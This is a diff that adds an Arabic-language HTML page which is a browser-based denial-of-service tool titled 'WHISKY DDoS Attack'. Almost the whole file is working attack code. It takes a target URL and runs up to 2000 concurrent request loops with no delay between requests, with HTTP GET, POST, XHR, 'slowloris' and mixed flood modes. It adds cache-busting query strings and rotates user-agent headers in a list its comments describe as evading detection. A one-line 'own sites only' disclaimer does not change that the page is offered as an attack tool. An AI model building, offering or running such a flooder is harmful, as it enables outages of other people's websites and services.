@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># WHISKY DDoS Attack #</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            font-family: 'Courier New', monospace;
+            color: #ff4444;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header {
+            text-align: center;
+            padding: 30px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 2px solid #ff4444;
+            box-shadow: 0 0 30px rgba(255,0,0,0.5);
+        }
+        .header h1 { font-size: 3em; text-shadow: 0 0 10px #ff0000; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card {
+            background: rgba(0,0,0,0.8);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid #ff4444;
+        }
+        .card h2 { color: #ff8844; margin-bottom: 20px; }
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #000;
+            border: 1px solid #ff4444;
+            border-radius: 8px;
+            color: #ff4444;
+            font-family: monospace;
+        }
+        .btn {
+            background: linear-gradient(45deg, #ff0000, #660000);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+        }
+        .stat-card {
+            background: #000;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid #ff4444;
+        }
+        .stat-value { font-size: 2.5em; font-weight: bold; color: #ff0000; }
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: #1a0000;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #ff4444;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6600);
+            transition: width 0.1s;
+        }
+        .logs {
+            background: #000;
+            border-radius: 10px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+        }
+        .warning {
+            background: rgba(255,0,0,0.2);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .attack-active { animation: pulse 0.5s infinite; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 DDos Attack 🔥</h1>
+            <p>استغلال المتصفح لإرسال ضغط هائل – استخدام قانوني فقط على مواقعك الخاصة</p>
+        </div>
+
+        <div class="warning" id="warning">
+            ⚠️ تنبيه: هذه الأداة تستهلك موارد جهازك بشكل كبير ⚠️
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <h2>❀ إعدادات الهجوم</h2>
+                <form id="attackForm">
+                    <label>🌐 الهدف (URL)</label>
+                    <input type="text" id="url" placeholder="https://target.com" required>
+                    
+                    <label>⚡ نوع الهجوم</label>
+                    <select id="attackType">
+                        <option value="http">HTTP Flood (GET)</option>
+                        <option value="http_post">HTTP POST Flood</option>
+                        <option value="slowloris">Slowloris (بطيء ولكن قاتل)</option>
+                        <option value="mixed">هجين (كل الأنواع)</option>
+                        <option value="xhr">XHR Flood (أسرع)</option>
+                    </select>
+                    
+                    <label>📊 الطلبات المتزامنة</label>
+                    <input type="number" id="concurrency" value="500" min="1" max="2000">
+                    
+                    <label>🔄 عدد الطلبات الإجمالي (0 = غير محدود)</label>
+                    <input type="number" id="totalRequests" value="0" min="0">
+                    
+                    <label># عشوائية المسارات (تجنب الكاش)</label>
+                    <input type="checkbox" id="randomPath" checked> نعم
+                    
+                    <div id="postDataArea" style="display:none;">
+                        <label>✦ بيانات POST</label>
+                        <textarea id="postData" rows="2">{"test":"data"}</textarea>
+                    </div>
+                </form>
+                
+                <div style="margin-top: 20px;">
+                    <button class="btn" id="startBtn"># بدء الهجوم #</button>
+                    <button class="btn" id="stopBtn" style="background:#333;">🛑 إيقاف</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>📊 إحصائيات الضغط</h2>
+                <div style="display: grid; grid-template-columns: repeat(2,1fr); gap: 10px;">
+                    <div class="stat-card"><div class="stat-value" id="totalSent">0</div><div>إجمالي الطلبات</div></div>
+                    <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div>نسبة النجاح</div></div>
+                    <div class="stat-card"><div class="stat-value" id="rps">0</div><div>طلب/ثانية</div></div>
+                    <div class="stat-card"><div class="stat-value" id="activeWorkers">0</div><div>طلبات نشطة</div></div>
+                </div>
+                <div class="progress-bar" style="margin: 15px 0;">
+                    <div class="progress-fill" id="progress" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card" style="margin-top: 20px;">
+            <h2>📋 سجل الهجوم</h2>
+            <div class="logs" id="logs"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============== المتغيرات العامة ==============
+        let isAttacking = false;
+        let activeWorkers = 0;
+        let stats = { total: 0, success: 0, failed: 0, startTime: 0 };
+        let intervals = [];
+        
+        // قائمة بالمسارات العشوائية (لتجنب التخزين المؤقت)
+        const randomPaths = [
+            '/', '/api', '/page', '/home', '/about', '/contact', '/products',
+            '/search', '/login', '/register', '/dashboard', '/profile', '/settings',
+            '/admin', '/test', '/debug', '/status', '/health', '/ping', '/info'
+        ];
+        
+        // رؤوس عشوائية لتجنب الكشف
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+        ];
+        
+        // ============== وظائف مساعدة ==============
+        function addLog(msg, type = 'info') {
+            const logsDiv = document.getElementById('logs');
+            const time = new Date().toLocaleTimeString();
+            const colors = { success: '#0f0', error: '#f00', info: '#ff0' };
+            logsDiv.innerHTML += `<div style="color:${colors[type] || '#fff'}">[${time}] ${msg}</div>`;
+            logsDiv.scrollTop = logsDiv.scrollHeight;
+        }
+        
+        function updateStats() {
+            document.getElementById('totalSent').textContent = stats.total;
+            const rate = stats.total > 0 ? (stats.success / stats.total * 100).toFixed(1) : 0;
+            document.getElementById('successRate').textContent = rate + '%';
+            const elapsed = (Date.now() - stats.startTime) / 1000;
+            const rps = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
+            document.getElementById('rps').textContent = rps;
+            document.getElementById('activeWorkers').textContent = activeWorkers;
+        }
+        
+        // ============== إرسال طلب واحد (بأقصى سرعة) ==============
+        async function sendFloodRequest(url, attackType, postData = null) {
+            const startTime = performance.now();
+            let finalUrl = url;
+            
+            // إضافة مسار عشوائي لتجنب الكاش
+            if (document.getElementById('randomPath').checked && attackType !== 'slowloris') {
+                const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
+                const separator = url.includes('?') ? '&' : '?';
+                finalUrl = url + separator + '_=' + Date.now() + Math.random();
+            }
+            
+            try {
+                const controller = new AbortController();
+                let timeoutId;
+                
+                // Slowloris: لا نستخدم timeout (نحاول إبقاء الاتصال مفتوحاً)
+                if (attackType !== 'slowloris') {
+                    timeoutId = setTimeout(() => controller.abort(), 3000);
+                }
+                
+                let options = {
+                    method: attackType === 'http_post' ? 'POST' : 'GET',
+                    headers: {
+                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                        'Accept': '*/*',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Connection': attackType === 'slowloris' ? 'keep-alive' : 'close',
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache'
+                    },
+                    signal: controller.signal,
+                    mode: 'cors',
+                    cache: 'no-store'
+                };
+                
+                if (attackType === 'http_post' && postData) {
+                    options.method = 'POST';
+                    options.headers['Content-Type'] = 'application/json';
+                    options.body = postData;
+                }
+                
+                // Slowloris: نمنع إكمال الطلب بسرعة (نرسل أجزاء)
+                if (attackType === 'slowloris') {
+                    // في المتصفح لا يمكن تنفيذ Slowloris حقيقياً بسبب قيود fetch
+                    // لكننا نستخدم timeout طويل
+                    options.signal = null;
+                }
+                
+                const response = await fetch(finalUrl, options);
+                if (timeoutId) clearTimeout(timeoutId);
+                
+                stats.success++;
+                return { success: true, status: response.status, time: (performance.now() - startTime) };
+            } catch (error) {
+                stats.failed++;
+                return { success: false, error: error.message, time: (performance.now() - startTime) };
+            } finally {
+                stats.total++;
+                updateStats();
+            }
+        }
+        
+        // ============== مشغل الهجمات المتوازية (أقصى ضغط) ==============
+        async function workerLoop(url, attackType, postData, shouldStop) {
+            activeWorkers++;
+            while (!shouldStop()) {
+                try {
+                    await sendFloodRequest(url, attackType, postData);
+                    // لا ننتظر أي شيء بين الطلبات (أقصى سرعة)
+                } catch(e) {}
+            }
+            activeWorkers--;
+        }
+        
+        // ============== هجوم XHR (أسرع باستخدام XMLHttpRequest القديم) ==============
+        function sendXHRFlood(url, shouldStop) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                let finalUrl = url;
+                if (document.getElementById('randomPath').checked) {
+                    finalUrl = url + (url.includes('?') ? '&' : '?') + '_=' + Date.now() + Math.random();
+                }
+                xhr.open('GET', finalUrl, true);
+                xhr.setRequestHeader('Cache-Control', 'no-cache');
+                xhr.setRequestHeader('Pragma', 'no-cache');
+                xhr.onload = () => { stats.success++; stats.total++; updateStats(); resolve(); };
+                xhr.onerror = () => { stats.failed++; stats.total++; updateStats(); resolve(); };
+                xhr.send();
+            });
+        }
+        
+        async function xhrWorkerLoop(url, shouldStop) {
+            activeWorkers++;
+            while (!shouldStop()) {
+                await sendXHRFlood(url, shouldStop);
+            }
+            activeWorkers--;
+        }
+        
+        // ============== هجوم مختلط (جميع الأنواع) ==============
+        async function mixedWorkerLoop(url, postData, shouldStop) {
+            activeWorkers++;
+            const types = ['http', 'http_post', 'xhr'];
+            while (!shouldStop()) {
+                const type = types[Math.floor(Math.random() * types.length)];
+                if (type === 'xhr') {
+                    await sendXHRFlood(url, shouldStop);
+                } else {
+                    await sendFloodRequest(url, type, postData);
+                }
+            }
+            activeWorkers--;
+        }
+        
+        // ============== بدء الهجوم ==============
+        async function startAttack() {
+            if (isAttacking) {
+                addLog('⚠️ هجوم قيد التشغيل بالفعل', 'error');
+                return;
+            }
+            
+            const url = document.getElementById('url').value;
+            if (!url) {
+                addLog('❌ الرجاء إدخال رابط الهدف', 'error');
+                return;
+            }
+            
+            const attackType = document.getElementById('attackType').value;
+            const concurrency = parseInt(document.getElementById('concurrency').value);
+            const totalRequests = parseInt(document.getElementById('totalRequests').value);
+            const postData = document.getElementById('postData').value;
+            
+            addLog(`💀 بدء هجوم DoS على: ${url}`, 'error');
+            addLog(`📊 النوع: ${attackType} | التزامن: ${concurrency}`, 'info');
+            
+            isAttacking = true;
+            stats = { total: 0, success: 0, failed: 0, startTime: Date.now() };
+            activeWorkers = 0;
+            updateStats();
+            
+            let stopFlag = false;
+            const shouldStop = () => stopFlag || (totalRequests > 0 && stats.total >= totalRequests);
+            
+            // تشغيل الـ Workers
+            const workers = [];
+            for (let i = 0; i < concurrency; i++) {
+                let worker;
+                if (attackType === 'xhr') {
+                    worker = xhrWorkerLoop(url, shouldStop);
+                } else if (attackType === 'mixed') {
+                    worker = mixedWorkerLoop(url, postData, shouldStop);
+                } else {
+                    worker = workerLoop(url, attackType, postData, shouldStop);
+                }
+                workers.push(worker);
+                // تأخير بسيط بين بدء العمال لتجنب تجميد المتصفح
+                await new Promise(r => setTimeout(r, 1));
+            }
+            
+            // مراقبة التقدم
+            const monitorInterval = setInterval(() => {
+                const elapsed = (Date.now() - stats.startTime) / 1000;
+                const rps = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
+                document.getElementById('rps').textContent = rps;
+                
+                if (totalRequests > 0) {
+                    const percent = (stats.total / totalRequests * 100);
+                    document.getElementById('progress').style.width = Math.min(percent, 100) + '%';
+                    if (stats.total >= totalRequests) {
+                        clearInterval(monitorInterval);
+                        stopAttack();
+                        addLog(`# اكتمل الهجوم! ${stats.total} طلب في ${elapsed.toFixed(1)} ثانية`, 'success');
+                    }
+                }
+            }, 500);
+            
+            intervals.push(monitorInterval);
+            
+            // انتظار اكتمال العمال
+            await Promise.all(workers);
+            clearInterval(monitorInterval);
+            isAttacking = false;
+        }
+        
+        function stopAttack() {
+            if (!isAttacking) {
+                addLog('⚠️ لا يوجد هجوم قيد التشغيل', 'error');
+                return;
+            }
+            isAttacking = false;
+            intervals.forEach(i => clearInterval(i));
+            intervals = [];
+            addLog('🛑 تم إيقاف الهجوم', 'info');
+        }
+        
+        // ============== ربط الأحداث ==============
+        document.getElementById('startBtn').onclick = startAttack;
+        document.getElementById('stopBtn').onclick = stopAttack;
+        
+        // إظهار/إخفاء حقل POST حسب نوع الهجوم
+        document.getElementById('attackType').onchange = function() {
+            const show = this.value === 'http_post' || this.value === 'mixed';
+            document.getElementById('postDataArea').style.display = show ? 'block' : 'none';
+        };
+        
+        addLog('🟢 الأداة جاهزة – DoS من المتصفح', 'success');
+        addLog('⚠️ استخدم فقط على مواقعك الخاصة', 'error');
+    </script>
+</body>
+</html>
